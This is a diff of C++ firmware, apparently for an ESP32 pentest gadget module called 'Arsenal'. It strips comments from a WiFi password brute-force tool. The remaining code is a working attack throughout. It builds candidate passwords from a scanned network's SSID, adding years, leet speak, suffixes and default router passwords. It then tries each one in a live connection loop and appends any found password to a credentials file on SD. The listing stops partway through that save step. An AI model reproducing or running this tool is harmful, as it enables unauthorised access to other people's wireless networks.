@@ -1,10 +1,3 @@
-// ═══════════════════════════════════════════════════════════
-// Arsenal - WiFi Brute Force with Smart Wordlist Generator
-// Auto-generates password candidates from SSID name
-// Attempts live connection to target network
-// Saves successful password + wordlist to SD
-// ═══════════════════════════════════════════════════════════
-
 #include "arsenal.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
@@ -21,7 +14,7 @@ std::vector<String> generateWordlist(String ssid) {
     base.toLowerCase();
     String baseUpper = ssid;
 
-    // Remove common suffixes/prefixes for base word extraction
+
     String clean = base;
     clean.replace("_", "");
     clean.replace("-", "");
@@ -32,7 +25,7 @@ std::vector<String> generateWordlist(String ssid) {
     clean.replace("home", "");
     clean.replace("guest", "");
 
-    // ─── Direct variations ───────────────────────────────
+
     words.push_back(base);
     words.push_back(baseUpper);
     words.push_back(base + "123");
@@ -46,14 +39,14 @@ std::vector<String> generateWordlist(String ssid) {
     words.push_back(base + "wifi");
     words.push_back(base + "net");
 
-    // ─── Year combinations ───────────────────────────────
+
     for (int y = 2018; y <= 2026; y++) {
         words.push_back(base + String(y));
         words.push_back(baseUpper + String(y));
         words.push_back(clean + String(y));
     }
 
-    // ─── Common suffixes ─────────────────────────────────
+
     const char *suffixes[] = {
         "!", "@", "#", "1!", "123!", "2024!", "2025!",
         "01", "02", "69", "99", "00", "007",
@@ -64,12 +57,12 @@ std::vector<String> generateWordlist(String ssid) {
         words.push_back(clean + String(suf));
     }
 
-    // ─── Common prefixes ─────────────────────────────────
+
     words.push_back("password" + base);
     words.push_back("admin" + base);
     words.push_back("welcome" + base);
 
-    // ─── Leet speak variations ───────────────────────────
+
     String leet = base;
     leet.replace("a", "4");
     leet.replace("e", "3");
@@ -79,7 +72,7 @@ std::vector<String> generateWordlist(String ssid) {
     words.push_back(leet);
     words.push_back(leet + "123");
 
-    // ─── Capitalized variations ──────────────────────────
+
     String capitalized = base;
     if (capitalized.length() > 0) {
         capitalized[0] = toupper(capitalized[0]);
@@ -89,7 +82,7 @@ std::vector<String> generateWordlist(String ssid) {
     words.push_back(capitalized + "2024");
     words.push_back(capitalized + "!");
 
-    // ─── Reversed ────────────────────────────────────────
+
     String reversed = "";
     for (int i = base.length() - 1; i >= 0; i--) {
         reversed += base[i];
@@ -97,18 +90,17 @@ std::vector<String> generateWordlist(String ssid) {
     words.push_back(reversed);
     words.push_back(reversed + "123");
 
-    // ─── Doubled ─────────────────────────────────────────
+
     words.push_back(base + base);
     words.push_back(clean + clean);
 
-    // ─── Phone number patterns (8 digits) ────────────────
-    // Common patterns people use: repetition of SSID chars as digits
+
     if (clean.length() >= 4) {
         words.push_back(clean.substring(0, 4) + "1234");
         words.push_back(clean.substring(0, 4) + "0000");
     }
 
-    // ─── Default router passwords ────────────────────────
+
     const char *defaults[] = {
         "admin", "password", "12345678", "1234567890",
         "00000000", "11111111", "88888888", "87654321",
@@ -120,11 +112,11 @@ std::vector<String> generateWordlist(String ssid) {
         words.push_back(String(d));
     }
 
-    // Filter: WPA requires min 8 chars
+
     std::vector<String> filtered;
     for (auto &w : words) {
         if (w.length() >= 8 && w.length() <= 63) {
-            // Deduplicate
+
             bool exists = false;
             for (auto &f : filtered) {
                 if (f == w) { exists = true; break; }
@@ -159,7 +151,7 @@ void arsenal_wifi_bruteforce(void) {
         delay(1500);
         return;
     }
-        // Scan for networks
+
         drawMainBorderWithTitle("WiFi Brute Force");
         tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
         tft.setTextSize(FP);
@@ -174,7 +166,7 @@ void arsenal_wifi_bruteforce(void) {
             return;
         }
 
-        // Select target
+
         options.clear();
         for (int i = 0; i < n && i < 15; i++) {
             String label = WiFi.SSID(i) + " (" + String(WiFi.RSSI(i)) + "dB)";
@@ -192,10 +184,10 @@ void arsenal_wifi_bruteforce(void) {
         String targetSSID = WiFi.SSID(targetIdx);
         WiFi.scanDelete();
 
-        // Generate wordlist
+
         auto wordlist = generateWordlist(targetSSID);
 
-        // Save wordlist to SD
+
         if (setupSdCard()) {
             if (!SD.exists("/arsenal")) SD.mkdir("/arsenal");
             String wlPath = "/arsenal/wordlist_" + targetSSID + ".txt";
@@ -208,7 +200,7 @@ void arsenal_wifi_bruteforce(void) {
             }
         }
 
-        // Start brute force
+
         int attempted = 0;
         int total = wordlist.size();
         bool found = false;
@@ -216,7 +208,7 @@ void arsenal_wifi_bruteforce(void) {
         unsigned long startTime = millis();
 
         for (auto &password : wordlist) {
-            // Draw UI
+
             drawMainBorderWithTitle("Brute Force");
             int y = 40;
             int padX = 10;
@@ -241,7 +233,7 @@ void arsenal_wifi_bruteforce(void) {
             tft.printf("Elapsed: %lus | ~%ds/try", elapsed, elapsed / max(1, attempted));
             y += 14;
 
-            // Progress bar
+
             int barW = tftWidth - 2 * padX;
             int barH = 6;
             tft.fillRect(padX, y, barW, barH, tft.color565(30, 30, 30));
@@ -251,7 +243,7 @@ void arsenal_wifi_bruteforce(void) {
             tft.setTextColor(TFT_RED, bruceConfig.bgColor);
             tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 18, 1);
 
-            // Try password
+
             if (tryConnect(targetSSID, password, 4000)) {
                 found = true;
                 foundPassword = password;
@@ -265,7 +257,7 @@ void arsenal_wifi_bruteforce(void) {
         }
 
         if (found) {
-            // SUCCESS!
+
             drawMainBorderWithTitle("PASSWORD FOUND!");
             tft.setTextColor(TFT_GREEN, bruceConfig.bgColor);
             tft.setTextSize(FM);
@@ -284,7 +276,7 @@ void arsenal_wifi_bruteforce(void) {
             tft.setCursor(10, y);
             tft.printf("Attempts: %d/%d", attempted + 1, total);
 
-            // Save to creds file
+
             if (setupSdCard()) {
                 File f = SD.open("/arsenal/creds.txt", FILE_APPEND);
                 if (f) {
